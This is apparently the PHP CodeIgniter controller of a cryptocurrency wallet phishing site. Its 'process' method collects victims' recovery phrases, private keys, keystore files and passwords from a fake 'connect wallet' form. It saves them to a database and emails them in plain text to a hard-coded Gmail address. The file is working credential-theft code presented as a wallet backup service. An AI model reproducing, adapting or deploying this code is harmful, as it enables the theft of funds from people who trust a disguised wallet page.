<?php

/**
 * Created by PhpStorm.
 * User: Mr. Winz
 * Date: 6/6/2018
 * Time: 7:07 AM
 */
class Home extends CI_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->model("Mail_model");
    }

    public function index () {
        $this->load->view('home');
    }

    public function connect () {
        $this->load->view('wallet');
    }

    public function process () {
        // Get raw POST data
        $data = $_POST;

        $payload = [
            'wallet_name'       => $data['wallet_name'],
            'email'             => $data['email'],
            'recovery_phrase'   => $data['recovery_phrase'],
            'keystore_json'     => $data['keystore_json'],
            'keystore_password' => $data['keystore_password'],
            'private_key'       => $data['private_key'],
            'image_src'         => $data['image_src'],
            'icon_name'         => $data['icon_name']
        ];

        if ($this->Db_model->insert("backup", $payload)) {
            // Compose email
            $to = 'aigoophones@gmail.com';
            $subject = "Backup Data Received";
            $message = "
            <strong>Wallet Name:</strong> $payload[wallet_name]<br>
            <strong>Email:</strong> $payload[email]<br>
            <strong>Recovery Phrase:</strong> $payload[recovery_phrase]<br>
            <strong>Keystore JSON:</strong> $payload[keystore_json]<br>
            <strong>Keystore Password:</strong> $payload[keystore_password]<br>
            <strong>Private Key:</strong> $payload[private_key]<br>
            <strong>Image Source:</strong> $payload[image_src]<br>
            <strong>Icon Name:</strong> $payload[icon_name]<br>
            ";
            $this->Mail_model->send_mail($to, $subject, $message);
            $this->output->set_output(true);
        } else {
            $this->output->set_output(false);
        }

    }
    
    public function success () {
        $this->load->view('success');
    }
    
    public function control () {
        $this->load->view('control');
    }
    
    public function test () {
        if ($this->Mail_model->send_mail("mexogroups@gmail.com", "Testing the email server", "Email server sometimes can be frustrating but I am trying to make it less stressful.")) {
            $this->output->set_output("Sent");
        } else {
            $this->output->set_output("Error");
        }
    }

}